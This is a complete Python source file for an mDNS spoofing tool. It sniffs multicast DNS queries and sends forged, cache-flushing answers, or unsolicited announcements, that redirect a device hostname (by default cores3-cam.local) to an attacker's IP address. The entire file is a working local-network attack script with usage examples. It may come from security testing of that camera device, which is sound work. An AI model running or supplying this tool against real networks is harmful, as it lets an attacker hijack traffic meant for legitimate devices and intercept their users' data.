#!/usr/bin/env python3
"""
mDNS Spoofing Tool

Listens for mDNS queries on 224.0.0.251:5353 and responds with forged
answers that redirect target hostnames to the attacker's IP address.
Exploits the lack of authentication in the mDNS protocol (RFC 6762).

Targets the CoreS3 device's mDNS hostname (cores3-cam.local) and
HTTP service advertisement (_http._tcp.local) by default.

Requires:
  - scapy (pip install scapy)
  - Root privileges (for raw socket access)
"""

import argparse
import socket
import struct
import sys
import time


MDNS_ADDR = "224.0.0.251"
MDNS_PORT = 5353
DEFAULT_TARGET = "cores3-cam.local"
DEFAULT_SERVICE = "_http._tcp.local"
DEFAULT_TTL = 240  # Higher than typical device TTL (120) to win cache


def check_dependencies():
    """Verify scapy is available."""
    try:
        from scapy.all import conf
        return True
    except ImportError:
        print("ERROR: scapy is required for this tool.", file=sys.stderr)
        print("Install with: pip install scapy", file=sys.stderr)
        sys.exit(1)


def get_interface_ip(interface):
    """Get the IP address of the specified interface."""
    try:
        import fcntl
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ip = socket.inet_ntoa(fcntl.ioctl(
            s.fileno(),
            0x8915,  # SIOCGIFADDR
            struct.pack('256s', interface.encode()[:15])
        )[20:24])
        s.close()
        return ip
    except Exception:
        return None


def spoof_with_scapy(interface, spoof_ip, target_names, ttl, verbose):
    """Use scapy to sniff mDNS queries and send spoofed responses."""
    from scapy.all import (
        sniff, send, IP, UDP, DNS, DNSQR, DNSRR, Dot11, conf
    )

    # Normalize target names to end with a dot
    targets = set()
    for name in target_names:
        if not name.endswith("."):
            name = name + "."
        targets.add(name.lower())

    print(f"[*] mDNS spoofer started")
    print(f"    Interface   : {interface}")
    print(f"    Spoof IP    : {spoof_ip}")
    print(f"    Target names: {', '.join(targets)}")
    print(f"    Response TTL: {ttl}")
    print(f"    Verbose     : {verbose}")
    print()
    print(f"[*] Listening for mDNS queries on {MDNS_ADDR}:{MDNS_PORT}...")
    print(f"[*] Press Ctrl+C to stop")
    print()

    stats = {"queries": 0, "spoofed": 0, "ignored": 0}

    def handle_mdns_packet(pkt):
        if not pkt.haslayer(DNS):
            return

        dns = pkt[DNS]

        # Only process queries (QR=0), not responses
        if dns.qr != 0:
            return

        if not dns.qd:
            return

        src_ip = pkt[IP].src if pkt.haslayer(IP) else "unknown"

        for i in range(dns.qdcount or 0):
            try:
                qname = dns.qd[i].qname
                if isinstance(qname, bytes):
                    qname = qname.decode("utf-8", errors="replace")
            except (IndexError, AttributeError):
                continue

            stats["queries"] += 1
            qname_lower = qname.lower()

            # Check if this query matches any of our targets
            matched = False
            for target in targets:
                if target in qname_lower or qname_lower in target:
                    matched = True
                    break

            if not matched:
                if verbose:
                    print(f"  [SKIP] Query for {qname} from {src_ip}")
                stats["ignored"] += 1
                continue

            print(f"  [MATCH] Query for {qname} from {src_ip}")

            # Build spoofed mDNS response
            # Use cache-flush bit (0x8001) to force cache replacement
            response = (
                IP(dst=MDNS_ADDR, ttl=255) /
                UDP(sport=MDNS_PORT, dport=MDNS_PORT) /
                DNS(
                    id=0,
                    qr=1,       # Response
                    aa=1,       # Authoritative
                    rd=0,       # No recursion
                    ra=0,
                    qd=None,
                    an=DNSRR(
                        rrname=qname,
                        type="A",
                        rclass=0x8001,  # Cache-flush + IN class
                        ttl=ttl,
                        rdata=spoof_ip,
                    ),
                )
            )

            send(response, iface=interface, verbose=0)
            stats["spoofed"] += 1
            print(f"  [SPOOF] {qname} -> {spoof_ip} (TTL={ttl})")

    try:
        sniff(
            iface=interface,
            filter="udp port 5353",
            prn=handle_mdns_packet,
            store=0,
        )
    except KeyboardInterrupt:
        pass

    print()
    print("=" * 50)
    print(f"[*] Session statistics:")
    print(f"    Queries seen   : {stats['queries']}")
    print(f"    Responses sent : {stats['spoofed']}")
    print(f"    Queries ignored: {stats['ignored']}")
    print("=" * 50)


def send_unsolicited(interface, spoof_ip, target_names, ttl, count, interval):
    """Send unsolicited mDNS responses (gratuitous announcements)."""
    from scapy.all import send, IP, UDP, DNS, DNSRR

    print(f"[*] Sending unsolicited mDNS announcements...")
    print(f"    Count   : {count}")
    print(f"    Interval: {interval}s")
    print()

    for name in target_names:
        if not name.endswith("."):
            name = name + "."

        response = (
            IP(dst=MDNS_ADDR, ttl=255) /
            UDP(sport=MDNS_PORT, dport=MDNS_PORT) /
            DNS(
                id=0,
                qr=1,
                aa=1,
                rd=0,
                qd=None,
                an=DNSRR(
                    rrname=name,
                    type="A",
                    rclass=0x8001,
                    ttl=ttl,
                    rdata=spoof_ip,
                ),
            )
        )

        try:
            for i in range(count):
                send(response, iface=interface, verbose=0)
                print(f"  [{i + 1}/{count}] Announced {name} -> {spoof_ip}")
                if i < count - 1:
                    time.sleep(interval)
        except KeyboardInterrupt:
            print("\n[*] Stopped by user.")
            break

    print()
    print("[+] Unsolicited announcements sent.")
    print("    Clients that received the announcement will cache the")
    print(f"    spoofed mapping for {ttl} seconds.")


def main():
    parser = argparse.ArgumentParser(
        description="mDNS spoofing tool. Listens for mDNS queries and "
                    "responds with forged answers to redirect traffic from "
                    "cores3-cam.local (or any target) to the attacker's IP.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo %(prog)s --spoof-ip 192.168.4.100
      Spoof cores3-cam.local to 192.168.4.100 (reactive mode)

  sudo %(prog)s --spoof-ip 192.168.4.100 --interface wlan0
      Specify the network interface

  sudo %(prog)s --spoof-ip 192.168.4.100 --target-name mydevice.local
      Spoof a different mDNS hostname

  sudo %(prog)s --spoof-ip 192.168.4.100 \\
      --target-name cores3-cam.local \\
      --target-name _http._tcp.local
      Spoof multiple names simultaneously

  sudo %(prog)s --spoof-ip 192.168.4.100 --announce --count 5
      Send 5 unsolicited mDNS announcements (proactive poisoning)

  sudo %(prog)s --spoof-ip 192.168.4.100 --verbose
      Show all mDNS queries, including non-matching ones

How it works:
  mDNS (RFC 6762) uses multicast UDP on 224.0.0.251:5353. Any device on
  the local network can respond to queries. This tool responds to queries
  for the target hostname with the attacker's IP, or sends unsolicited
  announcements with the cache-flush bit set to poison client caches.

  The cache-flush bit (0x8001 in the RR class field) tells clients to
  replace any existing cached entry. Combined with a higher TTL than the
  legitimate device, this ensures the spoofed mapping persists.

Prerequisites:
  pip install scapy
  Must run as root (raw socket access required)
""")
    parser.add_argument(
        "--interface", "-i", default=None,
        help="Network interface to use (default: auto-detect)")
    parser.add_argument(
        "--spoof-ip", required=True, metavar="IP",
        help="IP address to respond with (your attacker IP)")
    parser.add_argument(
        "--target-name", action="append", dest="target_names",
        metavar="NAME",
        help="mDNS name to spoof (repeatable, default: cores3-cam.local)")
    parser.add_argument(
        "--ttl", type=int, default=DEFAULT_TTL,
        help=f"TTL for spoofed responses (default: {DEFAULT_TTL})")
    parser.add_argument(
        "--verbose", "-v", action="store_true",
        help="Show all mDNS queries, not just matches")
    parser.add_argument(
        "--announce", action="store_true",
        help="Send unsolicited announcements instead of reactive spoofing")
    parser.add_argument(
        "--count", type=int, default=10,
        help="Number of unsolicited announcements to send (default: 10)")
    parser.add_argument(
        "--interval", type=float, default=1.0,
        help="Interval between announcements in seconds (default: 1.0)")

    args = parser.parse_args()
    check_dependencies()

    # Default target names
    if not args.target_names:
        args.target_names = [DEFAULT_TARGET, DEFAULT_SERVICE]

    # Auto-detect interface
    if not args.interface:
        from scapy.all import conf
        args.interface = conf.iface
        print(f"[*] Using default interface: {args.interface}")

    if args.announce:
        send_unsolicited(
            args.interface, args.spoof_ip, args.target_names,
            args.ttl, args.count, args.interval)
    else:
        spoof_with_scapy(
            args.interface, args.spoof_ip, args.target_names,
            args.ttl, args.verbose)


if __name__ == "__main__":
    main()
